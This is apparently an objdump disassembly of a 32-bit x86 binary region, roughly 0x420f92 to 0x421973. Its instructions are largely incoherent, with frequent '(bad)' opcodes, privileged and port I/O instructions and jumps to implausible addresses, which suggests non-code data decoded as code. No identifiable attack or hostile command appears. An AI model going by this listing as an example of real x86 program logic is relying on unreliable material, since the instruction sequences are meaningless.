  420f92:	mov    edi,0x1136da0
  420f97:	(bad)  
  420f98:	push   ecx
  420f99:	mov    gs,WORD PTR [esi]
  420f9b:	mov    al,fs:0xb80890a1
  420fa1:	inc    eax
  420fa2:	int    0x88
  420fa4:	mov    ebp,0x427a90bf
  420fa9:	jle    0x420fa0
  420fab:	fsubr  st(5),st
  420fad:	pop    edi
  420fae:	push   cs
  420faf:	sahf   
  420fb0:	xlat   BYTE PTR ds:[ebx]
  420fb1:	or     al,0x8c
  420fb3:	test   dh,dh
  420fb5:	adc    BYTE PTR [edi],ah
  420fb7:	or     al,0x31
  420fb9:	xchg   esi,eax
  420fba:	mov    dh,0xa8
  420fbc:	test   al,0x19
  420fbe:	sbb    ebp,DWORD PTR [eax+0x8]
  420fc1:	shr    cl,1
  420fc3:	dec    esi
  420fc4:	adc    esp,0x5efd7df8
  420fca:	out    dx,eax
  420fcb:	cmp    eax,0xfb0b5d56
  420fd0:	jns    0x420fc7
  420fd2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420fd3:	jmp    0x420fb3
  420fd5:	test   cl,al
  420fd7:	pop    ds
  420fd8:	pusha  
  420fd9:	or     eax,0x3530e436
  420fde:	sub    DWORD PTR [eax],ebx
  420fe0:	ins    BYTE PTR es:[edi],dx
  420fe1:	mov    DWORD PTR [esi-0x7e],0xf7a9e018
  420fe8:	dec    ebp
  420fe9:	pop    ebx
  420fea:	ins    DWORD PTR es:[edi],dx
  420feb:	and    BYTE PTR [esi],0x6
  420fee:	int    0x1b
  420ff0:	jge    0x420fee
  420ff2:	sbb    edx,DWORD PTR [ebx+0x33]
  420ff5:	dec    edi
  420ff6:	mov    BYTE PTR [esi],bh
  420ff8:	loop   0x420f9c
  420ffa:	adc    edx,DWORD PTR [edi+0x35]
  420ffd:	or     al,0xc7
  420fff:	imul   edi,DWORD PTR [edi],0xffffff84
  421002:	js     0x420f89
  421004:	pop    ss
  421005:	and    al,dl
  421007:	inc    ecx
  421008:	adc    ch,dh
  42100a:	mov    esi,0x2dfb1496
  42100f:	clc    
  421010:	mov    WORD PTR [eax+0x3f333d45],?
  421016:	imul   edi,edi,0x186fe824
  42101c:	jns    0x421037
  42101e:	xchg   esi,eax
  42101f:	adc    eax,DWORD PTR [ebp-0x3ccd7f72]
  421025:	sub    ah,dl
  421027:	in     eax,0xe7
  421029:	ja     0x42105a
  42102b:	and    al,0xee
  42102d:	cmp    bh,BYTE PTR [edi+ebp*2-0x3e169fd2]
  421034:	xchg   ecx,eax
  421035:	ret    
  421036:	xor    al,0x41
  421038:	(bad)  
  421039:	mov    ecx,0xa866ec90
  42103e:	and    al,0xe3
  421040:	add    DWORD PTR [edx+edi*8-0x26],eax
  421044:	sub    ebp,esi
  421046:	inc    edi
  421047:	and    DWORD PTR [esi-0x1],eax
  42104a:	fdivr  QWORD PTR [ebp+0x5af9a58d]
  421050:	mov    dl,0x96
  421052:	sub    BYTE PTR [edx],cl
  421054:	mov    ds:0x12d899af,al
  421059:	add    edx,DWORD PTR ds:0xebf4d4a2
  42105f:	push   edx
  421060:	mov    BYTE PTR [edx+edi*1+0x3e6489ef],al
  421067:	lods   eax,DWORD PTR ds:[esi]
  421068:	cs xchg esi,eax
  42106a:	push   ebp
  42106b:	ja     0x421068
  42106d:	out    dx,al
  42106e:	call   0x743ecf0c
  421073:	mov    ch,0x16
  421075:	sub    DWORD PTR [eax],ebp
  421077:	jns    0x4210c1
  421079:	jb     0x4210c4
  42107b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42107c:	push   0x5f
  42107e:	enter  0x293e,0xe8
  421082:	xor    esi,eax
  421084:	or     eax,0x54ce3556
  421089:	(bad)  
  42108a:	jmp    0x42102c
  42108c:	inc    edi
  42108d:	cmp    DWORD PTR [edx],ebx
  42108f:	popf   
  421090:	loopne 0x421092
	...
  4210f2:	add    BYTE PTR [eax],al
  4210f4:	lahf   
  4210f5:	pop    esi
  4210f6:	fcmovb st,st(6)
  4210f8:	fcmovnb st,st(6)
  4210fa:	lahf   
  4210fb:	pop    edi
  4210fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4210fd:	jne    0x4210e1
  4210ff:	mov    ss,WORD PTR [ebp-0x16]
  421102:	(bad)  
  421103:	dec    ebx
  421104:	cwde   
  421105:	pusha  
  421106:	add    DWORD PTR [eax],eax
  421108:	add    eax,0x43000001
  42110d:	stos   BYTE PTR es:[edi],al
  42110e:	int3   
  42110f:	hlt    
  421110:	jl     0x4210a4
  421112:	(bad)
  421116:	ins    DWORD PTR es:[edi],dx
  421117:	inc    edi
  421118:	jl     0x4210f6
  42111a:	jo     0x421146
  42111c:	ins    BYTE PTR es:[edi],dx
  42111d:	ds dec ecx
  42111f:	fnstsw WORD PTR [edx]
  421121:	mov    BYTE PTR [ebp+0x21192e1b],cl
  421127:	sbb    DWORD PTR [edi+ebx*1+0x4f],esp
  42112b:	sbb    ebx,DWORD PTR ds:[esi]
  42112e:	jne    0x421199
  421130:	dec    eax
  421131:	loope  0x4211a9
  421133:	ror    BYTE PTR [edi+0x6c06f6d1],1
  421139:	ret    0x2f8a
  42113c:	imul   ebp,DWORD PTR [esi-0x6c3a7929],0x7733cbd8
  421146:	dec    edx
  421147:	jle    0x421124
  421149:	xor    eax,0x1d50ab90
  42114e:	jns    0x4210d5
  421150:	mov    esp,0xde559678
  421155:	inc    ebp
  421156:	mov    ds:0xf96d8f26,eax
  42115b:	jnp    0x4210fe
  42115d:	mov    bh,0x62
  42115f:	pop    ebx
  421160:	fdiv   st,st(6)
  421162:	pop    eax
  421163:	popf   
  421164:	jge    0x421195
  421166:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421167:	inc    edx
  421168:	ds js  0x421115
  42116b:	aad    0x36
  42116d:	and    ecx,ebp
  42116f:	dec    ecx
  421170:	cwde   
  421171:	sbb    ecx,ebx
  421173:	fidiv  DWORD PTR [ecx]
  421175:	push   ds
  421176:	rcr    DWORD PTR [edx+0x3ba7ecf5],cl
  42117c:	les    esi,FWORD PTR [ebx]
  42117e:	jge    0x4211f6
  421180:	ja     0x421144
  421182:	les    ebx,FWORD PTR [edi]
  421184:	iret   
  421185:	cwde   
  421186:	push   eax
  421187:	push   0x5af09283
  42118c:	lahf   
  42118d:	add    eax,0x6cceb26f
  421192:	pop    ebx
  421193:	jmp    0x421185
  421195:	out    dx,al
  421196:	jns    0x4211fc
  421198:	xchg   esi,eax
  421199:	repz fdiv QWORD PTR [eax]
  42119c:	and    al,0x35
  42119e:	pop    esp
  42119f:	retf   
  4211a0:	addr16 into 
  4211a2:	imul   edi,DWORD PTR [ebx+0x12],0x57
  4211a6:	aad    0x4a
  4211a8:	stos   BYTE PTR es:[edi],al
  4211a9:	dec    ebx
  4211aa:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4211ac:	adc    ch,BYTE PTR cs:0xffa9400b
  4211b3:	xchg   ebx,eax
  4211b4:	inc    esi
  4211b5:	cmp    eax,0x472ff74b
  4211ba:	test   eax,0xd9a5d2b0
  4211bf:	out    dx,al
  4211c0:	adc    BYTE PTR [esi],dh
  4211c2:	mov    BYTE PTR [edx+0xd9b37af],al
  4211c8:	push   edi
  4211c9:	xor    edi,DWORD PTR [edx+esi*8-0x16]
  4211cd:	js     0x4211b2
  4211cf:	xor    BYTE PTR ds:0xe6382e77,0x3f
  4211d6:	xor    eax,0x5792ac2a
  4211db:	ror    DWORD PTR [ecx-0x68],cl
  4211de:	rcr    DWORD PTR [eax],0xfe
  4211e1:	sbb    edx,ebx
  4211e3:	stos   DWORD PTR es:[edi],eax
  4211e4:	jno    0x4211e4
  4211e6:	and    ah,BYTE PTR [ebx+0x4fdad69b]
  4211ec:	(bad)  
  4211ee:	lods   al,BYTE PTR ds:[esi]
  4211ef:	sub    ecx,edi
  4211f1:	jle    0x421237
  4211f3:	(bad)  
  4211f4:	jnp    0x4211f5
  4211f6:	retf   0x9e09
  4211f9:	add    ecx,ecx
  4211fb:	lods   al,BYTE PTR ds:[esi]
  4211fc:	pushf  
  4211fd:	push   eax
  4211fe:	jmp    0xe3547c59
  421203:	adc    ecx,DWORD PTR [eax-0x31]
  421206:	pop    esp
  421207:	jne    0x4211dd
  421209:	jne    0x421243
  42120b:	add    ch,BYTE PTR [ecx-0x16]
  42120e:	sub    dl,bh
  421210:	stos   BYTE PTR es:[edi],al
	...
  421271:	add    BYTE PTR [eax],al
  421273:	add    BYTE PTR [esi-0x700870e1],bl
  421279:	idiv   esi
  42127b:	jg     0x42123a
  42127d:	sub    eax,0xe9547ab3
  421282:	mov    eax,0x1619d80
  421287:	add    BYTE PTR ds:0x7a000001,al
  42128d:	loope  0x421235
  42128f:	pop    ds
  421290:	pop    ds
  421291:	sub    ecx,DWORD PTR [edi-0x2e]
  421294:	add    BYTE PTR [edx-0x4d],0xeb
  421298:	loope  0x42127e
  42129a:	popf   
  42129b:	loop   0x421303
  42129d:	jbe    0x4212c5
  42129f:	push   edx
  4212a0:	sbb    edi,edx
  4212a2:	sbb    dl,BYTE PTR gs:[edi-0x4d]
  4212a6:	les    ebp,FWORD PTR [edx+0x200c0d1c]
  4212ac:	pusha  
  4212ad:	nop
  4212ae:	adc    al,0xfc
  4212b0:	cwde   
  4212b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4212b2:	adc    eax,esp
  4212b4:	and    BYTE PTR [edx],0x2d
  4212b7:	xchg   edx,eax
  4212b8:	(bad)  
  4212b9:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4212bb:	and    bh,BYTE PTR [edi]
  4212bd:	lea    esi,[esp+edx*2+0x146613e3]
  4212c4:	aam    0xac
  4212c6:	and    ecx,DWORD PTR [esi]
  4212c8:	imul   ebx
  4212ca:	inc    ax
  4212cc:	mov    dl,0x1f
  4212ce:	pop    ecx
  4212cf:	push   edi
  4212d0:	(bad)  
  4212d1:	xchg   esi,eax
  4212d2:	pop    es
  4212d3:	mov    bh,0x24
  4212d5:	mov    ds:0x6e620374,eax
  4212da:	pushf  
  4212db:	jmp    0x2dee02dc
  4212e0:	xchg   ebp,eax
  4212e1:	jo     0x421313
  4212e3:	test   al,0xa7
  4212e5:	pop    ss
  4212e6:	xor    al,0x6e
  4212e8:	js     0x4212e1
  4212ea:	retf   0xff0e
  4212ed:	inc    eax
  4212ee:	cld    
  4212ef:	jle    0x4212cd
  4212f1:	add    eax,0xa6700ee4
  4212f6:	and    BYTE PTR [edi],ah
  4212f8:	int3   
  4212f9:	pop    edx
  4212fa:	(bad)  
  4212fb:	push   edx
  4212fc:	push   ss
  4212fd:	ss xchg esi,eax
  4212ff:	dec    ebp
  421300:	into   
  421301:	sbb    al,0xfc
  421303:	jp     0x421311
  421305:	jp     0x4212be
  421307:	or     eax,0x8ac77ced
  42130c:	ins    BYTE PTR es:[edi],dx
  42130d:	div    esi
  42130f:	mov    ecx,0x90f25d79
  421314:	icebp  
  421315:	add    BYTE PTR [ebx-0x109bde10],0xcb
  42131c:	int    0x8f
  42131e:	call   0xfb3cd52a
  421323:	sbb    BYTE PTR [esi],dl
  421325:	jns    0x42132e
  421327:	retf   
  421328:	stos   BYTE PTR es:[edi],al
  421329:	mov    dx,0xf39f
  42132d:	fwait
  42132e:	mov    edi,DWORD PTR [eax-0x4f1cd1b5]
  421334:	mov    ecx,0x3790ca53
  421339:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42133a:	adc    eax,0x60dbebc1
  42133f:	sub    DWORD PTR [ebx+0x5062b797],ebp
  421345:	sti    
  421346:	lods   eax,DWORD PTR ds:[esi]
  421347:	mov    ecx,0xaf66bacd
  42134c:	mul    BYTE PTR [eax+0x4c]
  42134f:	jmp    0x421346
  421351:	ss and al,0x78
  421354:	jno    0x421330
  421356:	adc    esp,DWORD PTR [ebx+0x3c]
  421359:	ins    BYTE PTR es:[edi],dx
  42135a:	out    dx,al
  42135b:	addr16 xchg bh,ah
  42135e:	pop    esi
  42135f:	push   eax
  421360:	mov    edx,0x54c80e4d
  421365:	out    0xc6,al
  421367:	inc    ecx
  421368:	aas    
  421369:	icebp  
  42136a:	rcl    DWORD PTR [ecx+0x2f],1
  42136d:	sub    DWORD PTR [ecx],ebx
  42136f:	or     BYTE PTR [edi],ch
  421371:	and    BYTE PTR [ebp+0x54],bh
  421374:	fdivp  st(0),st
  421376:	dec    ecx
  421377:	mov    bh,0x26
  421379:	jmp    0xefbb:0x815bfd94
  421380:	dec    esi
  421381:	xlat   BYTE PTR ds:[ebx]
  421382:	pop    ecx
  421383:	sbb    cl,dl
  421385:	pop    esi
  421386:	xlat   BYTE PTR ds:[ebx]
  421387:	add    BYTE PTR [esi-0x53ae7082],dh
  42138d:	dec    ebx
  42138e:	mov    DWORD PTR [edi+0x4f],ecx
	...
  4213f1:	add    BYTE PTR [eax],al
  4213f3:	add    dh,bh
  4213f5:	(bad)  
  4213f6:	pop    esp
  4213f7:	mov    eax,ds:0xdfffbb7d
  4213fc:	fstp   DWORD PTR [ebp-0x3e390b61]
  421402:	sbb    BYTE PTR [ebp-0x5e],0x62
  421406:	add    DWORD PTR [eax],eax
  421408:	add    eax,0x6b000001
  42140d:	push   0x3f
  42140f:	arpl   WORD PTR [eax],cx
  421411:	cmc    
  421412:	cmp    bh,dl
  421414:	js     0x4213a4
  421416:	jl     0x421445
  421418:	retf   
  421419:	(bad)
  42141c:	ss mov ch,0xad
  42141f:	pop    ecx
  421420:	and    BYTE PTR ss:[eax-0x5b],al
  421424:	mov    esp,esi
  421426:	adc    dh,BYTE PTR [eax]
  421428:	push   edi
  421429:	int3   
  42142a:	nop
  42142b:	mov    edi,0x2b52ba6c
  421430:	push   0x60
  421432:	iret   
  421433:	dec    esp
  421434:	in     al,dx
  421435:	leave  
  421436:	mov    dl,ch
  421438:	pushf  
  421439:	pop    ds
  42143a:	or     al,0x95
  42143c:	xchg   esi,eax
  42143d:	outs   dx,DWORD PTR ds:[esi]
  42143e:	(bad)  
  42143f:	sub    al,0x7b
  421441:	repz cmp cl,BYTE PTR [ebp+0x5b]
  421445:	jecxz  0x4213fd
  421447:	rol    BYTE PTR [eax],1
  421449:	mov    edi,ecx
  42144b:	sti    
  42144c:	loopne 0x42148f
  42144e:	push   ecx
  42144f:	pop    ss
  421450:	out    0x14,eax
  421452:	jp     0x421471
  421454:	dec    eax
  421455:	dec    edx
  421456:	mov    ss,WORD PTR [ecx+edi*8-0x9]
  42145a:	pop    es
  42145b:	shl    DWORD PTR [ebp+0x2a],0xd9
  42145f:	sbb    edi,DWORD PTR [ebp+0xfc5e563]
  421465:	xor    BYTE PTR [ebp-0x42],ah
  421468:	fldenv [ebp+0x9a04cd]
  42146e:	pop    eax
  42146f:	ins    DWORD PTR es:[edi],dx
  421470:	dec    ecx
  421471:	cld    
  421472:	mov    ds:0x4d1773c7,al
  421477:	push   ss
  421478:	xchg   ecx,eax
  421479:	mov    cl,0xaa
  42147b:	cmc    
  42147c:	or     al,0x3a
  42147e:	dec    ebx
  42147f:	(bad)  
  421480:	cmp    al,0x76
  421482:	and    DWORD PTR [ebx+0x66],eax
  421485:	add    eax,0x214182bd
  42148a:	sub    al,cl
  42148c:	(bad)  
  42148d:	retf   0xe7a
  421490:	inc    ebx
  421491:	adc    eax,0x2812fdbe
  421496:	lds    ebx,FWORD PTR [eax+0x57]
  421499:	mov    DWORD PTR [esi-0x9],eax
  42149c:	cmp    DWORD PTR [eax-0x55],esp
  42149f:	imul   esp,DWORD PTR [ebp+esi*2+0x7d78332c],0xc
  4214a7:	xor    ecx,edx
  4214a9:	add    eax,0x6010c6c1
  4214ae:	pop    esp
  4214af:	popf   
  4214b0:	scas   al,BYTE PTR es:[edi]
  4214b1:	arpl   WORD PTR [esi+eiz*1],si
  4214b4:	sti    
  4214b5:	hlt    
  4214b6:	pushf  
  4214b7:	jnp    0x42145b
  4214b9:	rcr    DWORD PTR [ebx+0xa],cl
  4214bc:	dec    esi
  4214bd:	xor    eax,0x428eb694
  4214c2:	sbb    DWORD PTR [edi+ebp*1+0x42e8b338],0xdb54b914
  4214cd:	or     eax,DWORD PTR [eax]
  4214cf:	inc    edx
  4214d0:	int3   
  4214d1:	pusha  
  4214d2:	mov    eax,DWORD PTR [eax]
  4214d4:	xlat   BYTE PTR ds:[ebx]
  4214d5:	mov    bl,0xc
  4214d7:	scas   al,BYTE PTR es:[edi]
  4214d8:	dec    eax
  4214d9:	mov    dh,0x3a
  4214db:	aad    0xc1
  4214dd:	enter  0x4305,0xd2
  4214e1:	xlat   BYTE PTR ds:[ebx]
  4214e2:	add    ah,BYTE PTR [ecx-0x1cc57b07]
  4214e8:	cwde   
  4214e9:	mov    esi,DWORD PTR ds:0x415dfc4f
  4214ef:	jecxz  0x4214e1
  4214f1:	jecxz  0x42152d
  4214f3:	out    dx,eax
  4214f4:	xchg   DWORD PTR [edi+eax*4],edx
  4214f7:	dec    edi
  4214f8:	mov    ah,0x53
  4214fa:	in     al,0x3c
  4214fc:	xchg   esp,eax
  4214fd:	xor    al,ch
  4214ff:	stos   BYTE PTR es:[edi],al
  421500:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421501:	fidiv  WORD PTR [ebx+edx*8]
  421504:	iret   
  421505:	pop    edi
  421506:	sub    DWORD PTR [edx],ebx
  421508:	data16 xlat BYTE PTR ds:[ebx]
  42150a:	xchg   edx,eax
  42150b:	cmp    edx,edi
  42150d:	push   ecx
  42150e:	xor    BYTE PTR [ecx+0x7],bl
	...
  421571:	add    BYTE PTR [eax],al
  421573:	add    dh,dl
  421575:	repnz test BYTE PTR [eax],bl
  421578:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421579:	jle    0x421559
  42157b:	(bad)  
  42157c:	arpl   WORD PTR [eax-0x4d60bd4c],bp
  421582:	cmp    esp,esi
  421584:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421585:	arpl   WORD PTR [ecx],ax
  421587:	add    BYTE PTR ds:0x78000001,al
  42158d:	adc    eax,0x20516cb5
  421592:	lahf   
  421593:	mov    eax,DWORD PTR [ebx]
  421595:	sub    DWORD PTR [ebx+eiz*2+0x5f63873b],0x3
  42159d:	dec    ebp
  42159e:	in     eax,0x29
  4215a0:	xchg   edx,eax
  4215a1:	pop    ebp
  4215a2:	sbb    ah,bl
  4215a4:	(bad)  
  4215a5:	hlt    
  4215a6:	iret   
  4215a7:	inc    esi
  4215a8:	(bad)  
  4215a9:	nop
  4215aa:	outs   dx,BYTE PTR ds:[esi]
  4215ab:	sub    DWORD PTR [edx+0x13],edx
  4215ae:	jo     0x42157d
  4215b0:	push   edx
  4215b1:	xor    eax,0x5b3f5213
  4215b6:	ret    
  4215b7:	xchg   edi,eax
  4215b8:	hlt    
  4215b9:	repnz and al,0x0
  4215bc:	sub    edx,DWORD PTR [ebx+0x4c770f17]
  4215c2:	rcr    DWORD PTR [ebx+ebx*2-0x61],1
  4215c6:	shl    BYTE PTR [eax-0x36],cl
  4215c9:	gs or  dl,bh
  4215cc:	repnz out dx,eax
  4215ce:	cli    
  4215cf:	push   edi
  4215d0:	ficom  WORD PTR [ebx+0x7e6dcfae]
  4215d6:	scas   al,BYTE PTR es:[edi]
  4215d7:	lock and DWORD PTR [ebx],esp
  4215da:	test   eax,0x25e0fdbb
  4215df:	sub    DWORD PTR [esi],esi
  4215e1:	imul   DWORD PTR [ecx+0x2c]
  4215e4:	mov    eax,0x786383ac
  4215e9:	bound  ebx,QWORD PTR [ebp+0x31]
  4215ec:	popa   
  4215ed:	pop    edi
  4215ee:	mov    ah,0xa2
  4215f0:	lahf   
  4215f1:	shl    BYTE PTR [ebx-0x40],0x92
  4215f5:	mov    ds:0x2723aa75,eax
  4215fa:	sbb    edx,esi
  4215fc:	adc    eax,0x4fb31775
  421601:	cmp    edi,edi
  421603:	xchg   esi,eax
  421604:	or     dh,BYTE PTR [edx+ebx*8-0xd92f63]
  42160b:	mov    dh,0x9c
  42160d:	test   DWORD PTR [edi],ebp
  42160f:	(bad)  
  421610:	or     ch,BYTE PTR [eax+0x3c8e1a0e]
  421616:	jl     0x421668
  421618:	daa    
  421619:	imul   ebx,esp,0x97bcd17b
  42161f:	sar    bl,0x1c
  421622:	jl     0x42161c
  421624:	ja     0x42165a
  421626:	ins    DWORD PTR es:[edi],dx
  421627:	dec    esi
  421628:	adc    eax,0x900d75ed
  42162d:	sub    al,0xe7
  42162f:	pop    edx
  421630:	fs stos DWORD PTR es:[edi],eax
  421632:	ffree  st(3)
  421634:	mov    bh,0x5b
  421636:	cvtdq2ps xmm5,xmm3
  421639:	ficomp WORD PTR [ebx]
  42163b:	mov    ebx,0x56bea0b0
  421640:	add    al,0xf7
  421642:	mov    bl,0x14
  421644:	mov    dh,0x1b
  421646:	mov    DWORD PTR [eax+0x53],0xdcd52d4a
  42164d:	mov    dl,0xd0
  42164f:	push   0xa0b6de78
  421654:	dec    edi
  421655:	pop    esi
  421656:	sub    ecx,DWORD PTR [edx]
  421658:	push   0xe1b7b97d
  42165d:	sbb    BYTE PTR [eax],cl
  42165f:	add    al,0xb3
  421661:	pop    ds
  421662:	inc    edi
  421663:	or     bl,BYTE PTR [edx-0x4]
  421666:	mov    ss,WORD PTR [esi]
  421668:	shl    DWORD PTR [esi+0x21],1
  42166b:	rcl    BYTE PTR [edi-0xd],0x11
  42166f:	fcmove st,st(0)
  421671:	pusha  
  421672:	pop    ecx
  421673:	or     al,0x5e
  421675:	cmp    bh,BYTE PTR [ebp-0x4f]
  421678:	sti    
  421679:	jge    0x421639
  42167b:	sub    edi,edx
  42167d:	popf   
  42167e:	jge    0x421669
  421680:	xchg   ebx,eax
  421681:	mov    ch,0xd7
  421683:	mov    WORD PTR [eax],fs
  421685:	mov    ah,0x99
  421687:	mov    eax,ds:0x3ac70b0a
  42168c:	dec    ebx
  42168d:	push   cs
  42168e:	jae    0x421688
  421690:	sldt   WORD PTR [eax]
	...
  4216f3:	add    BYTE PTR [ebx-0x105512d4],ch
  4216f9:	jmp    0x4216ea
  4216fb:	sub    eax,0xa3418669
  421700:	cld    
  421701:	data16 jl 0x4216ca
  421704:	lods   al,BYTE PTR ds:[esi]
  421705:	add    DWORD PTR fs:[eax],eax
  421708:	add    eax,0x54000001
  42170d:	or     esp,DWORD PTR [edi]
  42170f:	retf   
  421710:	out    0x61,al
  421712:	ficom  WORD PTR [ebp-0x13]
  421715:	inc    esi
  421716:	or     DWORD PTR [ecx+0xe],edi
  421719:	add    eax,0x86afc8de
  42171e:	xor    BYTE PTR [ebp-0x2a],ah
  421721:	pop    esi
  421722:	or     ch,BYTE PTR [esi+0x1a]
  421725:	test   eax,0x5bfeba94
  42172a:	fwait
  42172b:	iret   
  42172c:	cmc    
  42172d:	outs   dx,DWORD PTR ds:[esi]
  42172e:	mov    ecx,0xbdc92cd7
  421733:	call   0x50d3:0xc79c473b
  42173a:	adc    DWORD PTR [ecx+0x358e2c3e],0xd
  421741:	adc    dh,dh
  421743:	or     DWORD PTR [edx+0x50c84605],esp
  421749:	imul   edi,DWORD PTR [ebx+0x5f],0xffffffbd
  42174d:	inc    ebx
  42174e:	imul   edx,DWORD PTR [ebx+0x7],0xffffffbb
  421752:	out    dx,al
  421753:	test   BYTE PTR [ebx],bh
  421755:	repnz retf 
  421757:	jne    0x42171f
  421759:	mov    bl,0x63
  42175b:	stos   DWORD PTR es:[edi],eax
  42175c:	xor    bh,BYTE PTR [ebp-0x2a]
  42175f:	jmp    DWORD PTR [edx-0x67bb4edf]
  421765:	xor    al,0x62
  421767:	sbb    al,0xd1
  421769:	lea    eax,[ebx]
  42176b:	adc    eax,0x5bc1f6f4
  421770:	(bad)  
  421771:	in     al,dx
  421772:	cli    
  421773:	fwait
  421774:	pushf  
  421775:	daa    
  421776:	or     BYTE PTR [eax-0x595ff3c8],dl
  42177c:	cs hlt 
  42177e:	loope  0x421771
  421780:	jecxz  0x4217e4
  421782:	repnz ror BYTE PTR [ebx],1
  421785:	push   es
  421786:	inc    BYTE PTR [esi+0x77f9ae0d]
  42178c:	(bad)  
  42178d:	or     ecx,edi
  42178f:	test   eax,0xf7995bcd
  421794:	mov    bl,0x62
  421796:	add    BYTE PTR [edx-0x17dfa6e1],bl
  42179c:	pop    edx
  42179d:	adc    eax,0xadbbc26a
  4217a2:	mov    edx,0x522665df
  4217a7:	xor    BYTE PTR [ecx-0x39],ah
  4217aa:	push   ss
  4217ab:	cmp    BYTE PTR es:[ebx-0x67],ch
  4217af:	xchg   edi,eax
  4217b0:	fwait
  4217b1:	mov    al,ds:0x6400c7a1
  4217b6:	and    bl,bh
  4217b8:	arpl   WORD PTR [edx-0x79],sp
  4217bb:	lods   eax,DWORD PTR ds:[esi]
  4217bc:	jne    0x421822
  4217be:	bound  edi,QWORD PTR [ebp+0x77]
  4217c1:	and    eax,0x3a30dad1
  4217c6:	fcom   DWORD PTR [ebx]
  4217c8:	rcr    DWORD PTR [eax+0x12d9462d],cl
  4217ce:	out    dx,al
  4217cf:	xor    ecx,esp
  4217d1:	xor    al,0x77
  4217d3:	stos   BYTE PTR es:[edi],al
  4217d4:	gs retf 0x960d
  4217d8:	jae    0x421812
  4217da:	shr    esi,cl
  4217dc:	test   BYTE PTR [eax],0xee
  4217df:	ret    
  4217e0:	jmp    0xa47b4122
  4217e5:	jg     0x4217ce
  4217e7:	popf   
  4217e8:	in     al,0x9e
  4217ea:	loop   0x421869
  4217ec:	mov    ebx,0xa3c6e5ca
  4217f1:	adc    BYTE PTR [ebp+edi*1-0x7328c553],ah
  4217f8:	out    dx,al
  4217f9:	rol    DWORD PTR [edi+ebx*4],cl
  4217fc:	add    DWORD PTR [ecx],edx
  4217fe:	sahf   
  4217ff:	push   ecx
  421800:	adc    al,0x3d
  421802:	fadd   DWORD PTR [ecx-0x7384d011]
  421808:	loope  0x42183f
  42180a:	int    0xdc
  42180c:	xor    eax,0x7dfad823
	...
  421871:	add    BYTE PTR [eax],al
  421873:	add    cl,dl
  421875:	mov    al,ds:0xf9f9e0b9
  42187a:	fnstenv [ecx-0x359a0174]
  421880:	pop    esp
  421881:	popa   
  421882:	and    eax,0x165b12f
  421887:	add    BYTE PTR ds:0x6a000001,al
  42188d:	in     eax,0xb
  42188f:	sbb    eax,0xee2a897d
  421894:	mov    ebx,0xc5c50d8f
  421899:	loope  0x4218ae
  42189b:	retf   
  42189c:	or     BYTE PTR [edx-0x52],dh
  42189f:	sahf   
  4218a0:	inc    esp
  4218a1:	pop    edi
  4218a2:	sub    eax,DWORD PTR [edx]
  4218a4:	fmul   st,st(1)
  4218a6:	cli    
  4218a7:	in     eax,0x4a
  4218a9:	add    bl,BYTE PTR [esi]
  4218ab:	adc    ebx,DWORD PTR [edi-0x789a982b]
  4218b1:	jo     0x421912
  4218b3:	jmp    0xeb49d0e9
  4218b8:	test   al,0x3d
  4218ba:	add    al,0x44
  4218bc:	jmp    0x421907
  4218be:	add    eax,0xe0013eb4
  4218c3:	jo     0x421866
  4218c5:	pop    ebx
  4218c6:	nop
  4218c7:	or     ch,BYTE PTR ds:0xd59ec6c6
  4218cd:	(bad)  
  4218ce:	sbb    edi,edi
  4218d0:	imul   ebp,DWORD PTR fs:[eax-0x41],0xc058171e
  4218d8:	fld    TBYTE PTR ds:0xe91809bb
  4218de:	dec    ebp
  4218df:	sbb    ah,ch
  4218e1:	arpl   WORD PTR [ebp-0x68844c42],bp
  4218e7:	mov    esi,0xc32eaf77
  4218ec:	mov    ds:0x6ae6e48d,al
  4218f1:	popa   
  4218f2:	pop    edi
  4218f3:	cld    
  4218f4:	arpl   WORD PTR [esi-0x45],dx
  4218f7:	and    bl,BYTE PTR [edi]
  4218f9:	jbe    0x4218e5
  4218fb:	cdq    
  4218fc:	sbb    al,0x3e
  4218fe:	cwde   
  4218ff:	fcmovnu st,st(0)
  421901:	or     eax,0xc86c3692
  421906:	mov    bl,0xee
  421908:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421909:	aas    
  42190a:	mov    dh,0x67
  42190c:	ins    BYTE PTR es:[edi],dx
  42190d:	sbb    cl,al
  42190f:	push   eax
  421910:	fidiv  WORD PTR [ebp+0x59da596a]
  421916:	push   edi
  421917:	or     dl,bh
  421919:	cmp    ch,al
  42191b:	mov    ch,0xc9
  42191d:	adc    BYTE PTR ds:0x9e9a3a9f,ah
  421923:	or     esp,DWORD PTR [eax+ebx*1]
  421926:	cmp    cl,dh
  421928:	out    dx,eax
  421929:	xchg   edi,eax
  42192a:	mov    ch,0x2b
  42192c:	mov    bh,0xb5
  42192e:	out    dx,eax
  42192f:	push   edx
  421930:	jle    0x421909
  421932:	in     al,dx
  421933:	sub    al,0xe6
  421935:	sub    ah,BYTE PTR [ecx-0x52]
  421938:	jp     0x421919
  42193a:	xchg   edx,eax
  42193b:	jle    0x42193e
  42193d:	xchg   ebp,eax
  42193e:	loopne 0x421981
  421940:	test   eax,0x6a6bfa6f
  421945:	jb     0x421992
  421947:	cld    
  421948:	sub    edx,DWORD PTR [edx-0x7e4e1717]
  42194e:	fisttp QWORD PTR [ecx-0x1c]
  421951:	addr16 mov ds:0x3f96,al
  421955:	adc    al,dh
  421957:	cmp    ecx,DWORD PTR [ecx]
  421959:	xchg   ebp,eax
  42195a:	pop    ebx
  42195b:	ffreep st(6)
  42195d:	inc    esp
  42195e:	out    0x34,eax
  421960:	pop    eax
  421961:	daa    
  421962:	pusha  
  421963:	mov    eax,DWORD PTR [edi+esi*1+0x51]
  421967:	fnstenv [eax]
  421969:	imul   esp,ebp,0x46
  42196c:	in     eax,0x1a
  42196e:	sbb    DWORD PTR [edi+eiz*2+0x3f],ebp
  421972:	inc    edi
  421973:	cdq    
